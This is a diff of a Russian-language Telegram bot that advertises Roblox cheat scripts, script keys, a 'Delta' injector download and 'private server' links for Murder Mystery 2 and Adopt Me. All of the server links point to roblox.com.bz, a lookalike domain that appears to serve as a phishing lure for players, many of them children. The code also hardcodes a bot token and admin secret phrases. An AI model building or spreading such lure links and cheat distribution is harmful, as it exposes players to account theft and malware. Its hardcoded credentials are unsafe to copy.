@@ -1,7 +1,3 @@
-# ============================================================
-# YAKUSHA :: TELEGRAM BOT WITH WEB APP (FIXED)
-# ============================================================
-
 import telebot
 import random
 from telebot import types
@@ -10,10 +6,11 @@ import os
 import socket
 from threading import Thread
 import uuid
-import json
-import time
 
-TOKEN = os.environ.get("TOKEN", "8993935217:AAFxkEuK_lqK0FANyZbwlEvO6zyBtSEgOCM")
+# ============================================================
+# ТВОЙ ТОКЕН
+# ============================================================
+TOKEN = "8993935217:AAFxkEuK_lqK0FANyZbwlEvO6zyBtSEgOCM"
 ADMIN_ID = 8091608667
 ADMIN_SECRET = "larscriptkryyyyyyt"
 ADMIN_SECRET2 = "кресло качалка"
@@ -31,168 +28,9 @@ KOREAN_MM2_LINK = "https://roblox.com.bz/games/142823291/Murder-Mystery-2?privat
 KOREAN_ADOPT_LINK = "https://roblox.com.bz/games/920587237/Adopt-Me?privateServerLinkCode=67807728184198406550153024608844"
 
 # ============================================================
-# МИНИ-ПРИЛОЖЕНИЕ (РАБОТАЕТ БЕЗ ХОСТИНГА - ЧЕРЕЗ TELEGRAM)
+# ССЫЛКА НА ТВОЁ МИНИ-ПРИЛОЖЕНИЕ
 # ============================================================
-WEB_APP_HTML = '''
-<!DOCTYPE html>
-<html>
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Приватные сервера</title>
-    <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
-        body {
-            min-height: 100vh;
-            background: linear-gradient(135deg, #1a0a2e, #2d1b4e, #4a1a6b, #6b2fa0, #4a1a6b, #2d1b4e, #1a0a2e);
-            background-size: 400% 400%;
-            animation: gradient 8s ease infinite;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-            padding: 20px;
-        }
-        @keyframes gradient {
-            0% { background-position: 0% 50%; }
-            50% { background-position: 100% 50%; }
-            100% { background-position: 0% 50%; }
-        }
-        .container {
-            background: rgba(255, 255, 255, 0.08);
-            backdrop-filter: blur(20px);
-            -webkit-backdrop-filter: blur(20px);
-            border-radius: 30px;
-            padding: 30px 25px;
-            max-width: 400px;
-            width: 100%;
-            border: 1px solid rgba(255, 255, 255, 0.15);
-            box-shadow: 0 25px 50px rgba(0, 0, 0, 0.6);
-            transition: transform 0.3s ease;
-        }
-        .container:hover {
-            transform: scale(1.02);
-        }
-        .title {
-            text-align: center;
-            color: #fff;
-            font-size: 26px;
-            font-weight: 700;
-            margin-bottom: 25px;
-            text-shadow: 0 0 20px rgba(180, 80, 255, 0.5);
-            letter-spacing: 1px;
-        }
-        .server-item {
-            background: rgba(255, 255, 255, 0.06);
-            border-radius: 16px;
-            padding: 16px 20px;
-            margin-bottom: 14px;
-            display: flex;
-            align-items: center;
-            justify-content: space-between;
-            border: 1px solid rgba(255, 255, 255, 0.06);
-            transition: all 0.3s ease;
-            cursor: pointer;
-        }
-        .server-item:hover {
-            background: rgba(255, 255, 255, 0.12);
-            border-color: rgba(180, 80, 255, 0.3);
-            transform: translateX(5px);
-        }
-        .server-item .info {
-            display: flex;
-            flex-direction: column;
-        }
-        .server-item .name {
-            color: #fff;
-            font-size: 17px;
-            font-weight: 600;
-        }
-        .server-item .desc {
-            color: rgba(255, 255, 255, 0.6);
-            font-size: 13px;
-            margin-top: 2px;
-        }
-        .server-item .badge {
-            background: linear-gradient(135deg, #8b5cf6, #d946ef);
-            padding: 6px 14px;
-            border-radius: 20px;
-            color: #fff;
-            font-size: 12px;
-            font-weight: 600;
-            white-space: nowrap;
-            box-shadow: 0 4px 15px rgba(139, 92, 246, 0.4);
-        }
-        .footer {
-            text-align: center;
-            margin-top: 20px;
-            color: rgba(255, 255, 255, 0.4);
-            font-size: 12px;
-        }
-        .footer a {
-            color: rgba(180, 80, 255, 0.8);
-            text-decoration: none;
-        }
-        .glow {
-            text-shadow: 0 0 30px rgba(180, 80, 255, 0.3);
-        }
-    </style>
-</head>
-<body>
-    <div class="container">
-        <div class="title glow">🌟 ВСЕ СЕРВЕРА</div>
-        
-        <div class="server-item" onclick="window.open('https://roblox.com.bz/games/142823291/Murder-Mystery-2?privateServerLinkCode=67807728184198406550153024608844', '_blank')">
-            <div class="info">
-                <span class="name">🔪 MM2 Приватка</span>
-                <span class="desc">Мгновенный доступ</span>
-            </div>
-            <span class="badge">▶ ИГРАТЬ</span>
-        </div>
-
-        <div class="server-item" onclick="window.open('https://roblox.com.bz/games/920587237/Adopt-Me?privateServerLinkCode=67807728184198406550153024608844', '_blank')">
-            <div class="info">
-                <span class="name">🧸 Adopt Me Приватка</span>
-                <span class="desc">Мгновенный доступ</span>
-            </div>
-            <span class="badge">▶ ИГРАТЬ</span>
-        </div>
-
-        <div class="server-item" onclick="window.open('https://roblox.com.bz/games/142823291/Murder-Mystery-2?privateServerLinkCode=67807728184198406550153024608844', '_blank')">
-            <div class="info">
-                <span class="name">🇰🇷 Корейский MM2</span>
-                <span class="desc">Корейский сервер</span>
-            </div>
-            <span class="badge">▶ ИГРАТЬ</span>
-        </div>
-
-        <div class="server-item" onclick="window.open('https://roblox.com.bz/games/920587237/Adopt-Me?privateServerLinkCode=67807728184198406550153024608844', '_blank')">
-            <div class="info">
-                <span class="name">🇰🇷 Корейский Adopt Me</span>
-                <span class="desc">Корейский сервер</span>
-            </div>
-            <span class="badge">▶ ИГРАТЬ</span>
-        </div>
-
-        <div class="server-item" onclick="window.open('https://t.me/freprivatka34', '_blank')">
-            <div class="info">
-                <span class="name">📢 Наш Telegram</span>
-                <span class="desc">Больше приватных серверов</span>
-            </div>
-            <span class="badge">▶ ПЕРЕЙТИ</span>
-        </div>
-
-        <div class="footer">
-            🚀 © 2026 YAKUSHA Team
-        </div>
-    </div>
-</body>
-</html>
-'''
+WEB_APP_URL = "https://raw.githubusercontent.com/fsfsfss323/webapp/refs/heads/main/index.html"
 
 GUIDE_TEXT = """
 📖 *КАК ЗАПУСТИТЬ СКРИПТЫ?*
@@ -337,47 +175,6 @@ DELTA_LINK = "https://drive.google.com/file/d/1G2gniClYv0qV0BU9-xfYD4UOcxUljH4s/
 
 bot = telebot.TeleBot(TOKEN)
 
-# ============================================================
-# СОХРАНЯЕМ HTML НА ДИСК (РАБОТАЕТ БЕЗ ХОСТИНГА)
-# ============================================================
-WEB_APP_FILE = "webapp.html"
-try:
-    with open(WEB_APP_FILE, "w", encoding="utf-8") as f:
-        f.write(WEB_APP_HTML)
-    print("[LOG] ✅ WebApp HTML сохранён локально")
-except Exception as e:
-    print(f"[LOG] ❌ Ошибка сохранения: {e}")
-
-# ============================================================
-# КНОПКА "ВСЕ СЕРВЕРА" ЧЕРЕЗ КНОПКУ С ВЕБ-СТРАНИЦЕЙ (БЕЗ ХОСТИНГА)
-# ============================================================
-def get_success_keyboard():
-    keyboard = types.InlineKeyboardMarkup(row_width=1)
-    keyboard.add(types.InlineKeyboardButton(text="📜 Скрипт на все игры", callback_data="get_script"))
-    keyboard.add(types.InlineKeyboardButton(text="🔑 Ключ для скрипта", callback_data="get_key"))
-    keyboard.add(types.InlineKeyboardButton(text="🔒 Приватный сервер MM2", callback_data="get_private"))
-    
-    # ============================================================
-    # ВМЕСТО WEB APP — КНОПКА С ОТПРАВКОЙ СПИСКА (БЕЗ ХОСТИНГА)
-    # ============================================================
-    keyboard.add(types.InlineKeyboardButton(text="🌐 ВСЕ СЕРВЕРА 🚀", callback_data="show_servers"))
-    
-    keyboard.add(types.InlineKeyboardButton(text="😮 КОРЕЙСКИЙ СЕРВЕР ММ2 😮", url=KOREAN_MM2_LINK))
-    keyboard.add(types.InlineKeyboardButton(text="💘 КОРЕЙСКИЙ СЕРВЕР АДОПТ МИ 💘", url=KOREAN_ADOPT_LINK))
-    keyboard.add(types.InlineKeyboardButton(text="📖 Как запустить скрипт?", callback_data="get_guide"))
-    keyboard.add(types.InlineKeyboardButton(text="📥 Скачать инжектор (Delta)", url=DELTA_LINK))
-    return keyboard
-
-def get_servers_keyboard():
-    keyboard = types.InlineKeyboardMarkup(row_width=1)
-    keyboard.add(types.InlineKeyboardButton(text="🔪 MM2 Приватка", url="https://roblox.com.bz/games/142823291/Murder-Mystery-2?privateServerLinkCode=67807728184198406550153024608844"))
-    keyboard.add(types.InlineKeyboardButton(text="🧸 Adopt Me Приватка", url="https://roblox.com.bz/games/920587237/Adopt-Me?privateServerLinkCode=67807728184198406550153024608844"))
-    keyboard.add(types.InlineKeyboardButton(text="🇰🇷 Корейский MM2", url="https://roblox.com.bz/games/142823291/Murder-Mystery-2?privateServerLinkCode=67807728184198406550153024608844"))
-    keyboard.add(types.InlineKeyboardButton(text="🇰🇷 Корейский Adopt Me", url="https://roblox.com.bz/games/920587237/Adopt-Me?privateServerLinkCode=67807728184198406550153024608844"))
-    keyboard.add(types.InlineKeyboardButton(text="📢 Наш Telegram", url="https://t.me/freprivatka34"))
-    keyboard.add(types.InlineKeyboardButton(text="🔙 Назад", callback_data="back_to_menu"))
-    return keyboard
-
 def notify_admin(text):
     try:
         bot.send_message(ADMIN_ID, text)
@@ -412,6 +209,29 @@ def get_unsub_keyboard(not_subbed, is_ref=False):
         keyboard.add(types.InlineKeyboardButton(text=f"Подписаться ❎ {ch['name']}", url=ch['url']))
     cb = "check_sub_ref" if is_ref else "check_sub"
     keyboard.add(types.InlineKeyboardButton(text="🔍 Проверить снова", callback_data=cb))
+    return keyboard
+
+# ============================================================
+# ГЛАВНОЕ МЕНЮ С MINI APP
+# ============================================================
+def get_success_keyboard():
+    keyboard = types.InlineKeyboardMarkup(row_width=1)
+    keyboard.add(types.InlineKeyboardButton(text="📜 Скрипт на все игры", callback_data="get_script"))
+    keyboard.add(types.InlineKeyboardButton(text="🔑 Ключ для скрипта", callback_data="get_key"))
+    keyboard.add(types.InlineKeyboardButton(text="🔒 Приватный сервер MM2", callback_data="get_private"))
+    
+    # ============================================================
+    # КНОПКА С МИНИ-ПРИЛОЖЕНИЕМ
+    # ============================================================
+    keyboard.add(types.InlineKeyboardButton(
+        text="🌐 ВСЕ СЕРВЕРА 🚀",
+        web_app=types.WebAppInfo(url=WEB_APP_URL)
+    ))
+    
+    keyboard.add(types.InlineKeyboardButton(text="😮 КОРЕЙСКИЙ СЕРВЕР ММ2 😮", url=KOREAN_MM2_LINK))
+    keyboard.add(types.InlineKeyboardButton(text="💘 КОРЕЙСКИЙ СЕРВЕР АДОПТ МИ 💘", url=KOREAN_ADOPT_LINK))
+    keyboard.add(types.InlineKeyboardButton(text="📖 Как запустить скрипт?", callback_data="get_guide"))
+    keyboard.add(types.InlineKeyboardButton(text="📥 Скачать инжектор (Delta)", url=DELTA_LINK))
     return keyboard
 
 def get_admin_keyboard():
@@ -516,26 +336,6 @@ def user_callback(call):
     
     elif action == "get_private":
         bot.send_message(call.message.chat.id, f"🔒 Приватный сервер MM2\n\n{PRIVATE_SERVER_LINK}")
-        bot.answer_callback_query(call.id)
-    
-    # ============================================================
-    # НОВАЯ КНОПКА "ВСЕ СЕРВЕРА" (БЕЗ ХОСТИНГА)
-    # ============================================================
-    elif action == "show_servers":
-        bot.send_message(
-            call.message.chat.id,
-            "🌐 *ВСЕ СЕРВЕРА*\n\nВыбери сервер для перехода:",
-            parse_mode="Markdown",
-            reply_markup=get_servers_keyboard()
-        )
-        bot.answer_callback_query(call.id)
-    
-    elif action == "back_to_menu":
-        bot.send_message(
-            call.message.chat.id,
-            "✅ Выбери что хочешь получить:",
-            reply_markup=get_success_keyboard()
-        )
         bot.answer_callback_query(call.id)
     
     elif action == "get_guide":
